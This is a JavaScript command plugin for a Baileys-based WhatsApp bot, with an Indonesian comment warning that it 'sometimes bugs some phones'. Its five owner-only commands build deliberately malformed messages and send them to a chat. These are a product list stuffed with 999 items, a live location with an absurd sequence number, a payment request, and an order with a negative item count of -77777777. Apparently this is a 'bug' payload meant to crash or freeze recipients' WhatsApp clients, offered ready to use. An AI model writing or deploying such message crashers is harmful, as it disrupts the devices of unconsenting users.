// Kadang buat bug di beberapa hp, maka gunakan dengan bijak!!!!!!1
import fetch from "node-fetch"

import { generateWAMessageFromContent } from "@adiwajshing/baileys"
let handler  = async (m, { conn, command }) => {

// 1
if (command == 'funclist') {
let arr = []
for (let i = 0; i < 999; i++) arr.push({ productId: '5164304847020057' }) 
  let prep = generateWAMessageFromContent(m.chat, {
	listMessage: {
		title: author, description: conn.user.name,
		buttonText: 'Ok', listType: 2,
		sections: [], productListInfo: {
			productSections: [{ title: ucapan, products: arr }],
			headerImage: {
				productId: '5164304847020057', jpegThumbnail: await conn.resize(logo, 300, 150)
			},
			businessOwnerJid: m.sender
		},
		footerText: wm,
		contextInfo: null 
	}
}, {})
return conn.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
}

// 2
if (command == 'funcloc') {
let prep = generateWAMessageFromContent(m.chat, { liveLocationMessage: { 
degreesLatitude: 35.685506276233525, degreesLongitude: 139.75270667105852,
caption: wm,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: await conn.resize(logo, 300, 150)
}}, { quoted: fakes, ephemeralExpiration: ephemeral })
return conn.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
}

// 3
if (command == 'funcloc2') {
let pp = 'https://tinyurl.com/24u64tky'
  try {
    pp = await conn.profilePictureUrl(m.sender, 'image')
  } catch (e) {
  pp = logo
  }
let msg = await generateWAMessageFromContent(m.chat, { locationMessage: {
  degreesLatitude: 0,
  degreesLongitude: 0,
  name: 'y',
  address: me,
  url: 'https://github.com/Rlxfly',
  isLive: true,
  accuracyInMeters: 0,
  speedInMps: 0,
  degreesClockwiseFromMagneticNorth: 2,
  comment: '',
  jpegThumbnail: await( await fetch(pp)).buffer()
}}, { quoted: fakes, ephemeralExpiration: ephemeral })
return conn.relayMessage(m.chat, msg.message, {})
}

// 4
if (command == 'funcpay') {
await conn.relayMessage(m.chat, { requestPaymentMessage: {
  noteMessage: { extendedTextMessage: { text: wm,
  currencyCodeIso4217: 'USD',
  requestFrom: m.sender,
  expiryTimestamp: 8600,
  amount: 10000,
  background: await conn.resize(logo, 300, 150)
}}}}, {})
}

// 5
if (command == 'funcord') {
let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
orderId: '5352482274766633',
  thumbnail: await conn.resize(logo, 300, 150),
  itemCount: -77777777,
  status: 1,
  surface: 1,
  message: wm,
  orderTitle: author,
  sellerJid: m.sender,
  token: '1655878716',
  priceAmount: '666000',
  totalAmount1000: '1000000000',
  totalCurrencyCode: 'IDR',
  contextInfo: null,
}}, { quoted: fakes, ephemeralExpiration: ephemeral })
 await conn.relayMessage(m.chat, prep.message,  { messageId: prep.key.id })
}

}
handler.command = /^func(l(oc2|ist)|loc|ord|pay)$/i
handler.owner = true
export default handler
